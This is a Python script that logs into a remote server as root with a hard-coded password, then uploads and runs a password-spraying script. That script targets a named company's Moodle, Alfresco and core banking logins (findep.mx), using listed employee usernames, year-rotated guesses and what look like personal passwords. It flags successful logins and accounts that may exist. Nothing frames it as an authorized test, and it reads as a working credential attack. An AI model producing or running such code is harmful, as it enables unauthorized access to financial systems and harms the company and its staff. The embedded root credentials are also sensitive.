import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Year-rotated passwords
YEAR_PASSWORDS = [
    "Fisa2026*", "Fisa2026!", "Fisa2025*", "Fisa2025!", "Fisa2024*",
    "Fisa1234*", "Fisa1234!", "Fisa12345*",
    "Findep2026*", "Findep2025*", "Findep2024*",
    "Capacita-2026", "Capacita-1",
    "Independencia2026*", "Independencia2025*",
    "Universidad2026*", "Universidad2025*",
]

USERS = ["jcruzval", "jjaimesva", "lmiramontes", "jriosgonz", "out_epadillar", "admin"]

# === MOODLE with body check ===
sys.stdout.write("=" * 60 + "\n=== MOODLE YEAR-ROTATED SPRAY ===\n" + "=" * 60 + "\n\n")
sys.stdout.flush()

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

for user in USERS:
    for pw in YEAR_PASSWORDS:
        try:
            r1 = s.get("https://universidad.findep.mx/login/index.php", timeout=10)
            m = re.search(r'name="logintoken"\s+value="([^"]+)"', r1.text)
            if not m:
                sys.stdout.write(f"  No token!\n")
                break
            token = m.group(1)
            r = s.post(
                "https://universidad.findep.mx/login/index.php",
                data={"anchor": "", "logintoken": token, "username": user, "password": pw, "rememberusername": "1"},
                allow_redirects=True, timeout=10
            )
            is_fail = "loginerrormessage" in r.text or "invalidlogin" in r.text.replace(" ", "").lower() or "errorcode" in r.text.lower()
            is_dashboard = "/my/" in r.url or "dashboard" in r.url
            if is_dashboard or (not is_fail and r.status_code == 200 and "/my/" in r.text[:2000]):
                sys.stdout.write(f"  *** HIT *** {user}:{pw} -> {r.url}\n")
                sys.stdout.write(f"    Title: {re.search(r'<title>(.*?)</title>', r.text[:2000]).group(1) if re.search(r'<title>(.*?)</title>', r.text[:2000]) else '?'}\n")
                sys.stdout.flush()
                break
            else:
                pass  # silent fail
        except Exception as e:
            sys.stdout.write(f"  ERR {user}:{pw}: {e}\n")
        sys.stdout.flush()
        time.sleep(0.5)
    sys.stdout.write(f"  {user}: done ({len(YEAR_PASSWORDS)} tried)\n")
    sys.stdout.flush()

# === ALFRESCO YEAR-ROTATED ===
sys.stdout.write("\n" + "=" * 60 + "\n=== ALFRESCO YEAR-ROTATED SPRAY ===\n" + "=" * 60 + "\n\n")
sys.stdout.flush()

for user in ["Jjaimesva", "jjaimesva", "admin", "jcruzval", "lmiramontes"]:
    for pw in YEAR_PASSWORDS:
        try:
            r = s.post(
                "https://portafolio.findep.mx/alfresco/s/api/login",
                json={"username": user, "password": pw},
                timeout=10
            )
            if r.status_code == 200 and "ticket" in r.text.lower():
                sys.stdout.write(f"  *** ALFRESCO HIT *** {user}:{pw}\n")
                sys.stdout.write(f"    {r.text[:300]}\n")
                sys.stdout.flush()
                break
            # Different error = user might exist
            if "Login failed" not in r.text:
                sys.stdout.write(f"  DIFF RESPONSE {user}:{pw}: [{r.status_code}] {r.text[:200]}\n")
        except Exception as e:
            sys.stdout.write(f"  ERR {user}:{pw}: {e}\n")
        time.sleep(0.3)
    sys.stdout.write(f"  {user}: done\n")
    sys.stdout.flush()

# === CORE valida.do ===
sys.stdout.write("\n" + "=" * 60 + "\n=== CORE BANKING valida.do LOGIN ===\n" + "=" * 60 + "\n\n")
sys.stdout.flush()

# First get the login page to extract tokens
try:
    r = s.get("https://core.findep.mx/", timeout=10)
    # Extract cve_idToken
    token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r.text)
    cve_token = token_m.group(1) if token_m else ""
    sys.stdout.write(f"  cve_idToken: {cve_token[:60]}...\n")
    
    # Extract any hidden fields
    hiddens = re.findall(r'<input[^>]+type="hidden"[^>]+name="([^"]+)"[^>]+value="([^"]*)"', r.text)
    sys.stdout.write(f"  Hidden fields: {hiddens}\n\n")
except Exception as e:
    sys.stdout.write(f"  ERR getting login page: {e}\n")
    cve_token = ""

core_users = ["jjaimesva", "jcruzval", "lmiramontes", "admin"]
core_passwords = [
    "Jesus182543=", "Fisa1234*", "Fisa1234", "Fisa2026*", "Fisa2025*",
    "Dipperm8$", "Igual2020*", "Fisa2022*", "Fisa2026!",
]

for user in core_users:
    for pw in core_passwords:
        try:
            # Re-fetch to get fresh token
            r_page = s.get("https://core.findep.mx/", timeout=10)
            token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r_page.text)
            tok = token_m.group(1) if token_m else cve_token
            
            r = s.post(
                "https://core.findep.mx/valida.do",
                data={
                    "cve_idToken": tok,
                    "msjPass": "",
                    "cveUsr": user,
                    "cve_usr": user,
                    "cve_psd": pw,
                    "ok_btn": "Entrar"
                },
                allow_redirects=False,
                timeout=10
            )
            loc = r.headers.get("Location", "")
            # Detect success vs failure
            is_fail = "error" in loc.lower() or r.status_code == 200
            sys.stdout.write(f"  {user}:{pw} -> [{r.status_code}] Loc={loc[:80]} Size={len(r.text)}b\n")
            if r.status_code in (301, 302) and "error" not in loc.lower() and loc:
                sys.stdout.write(f"    *** POSSIBLE HIT — redirect to {loc} ***\n")
        except Exception as e:
            sys.stdout.write(f"  {user}:{pw} -> ERR: {e}\n")
        sys.stdout.flush()
        time.sleep(0.5)

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/validate_v2.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/validate_v2.py 2>&1', timeout=600)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Done.', flush=True)
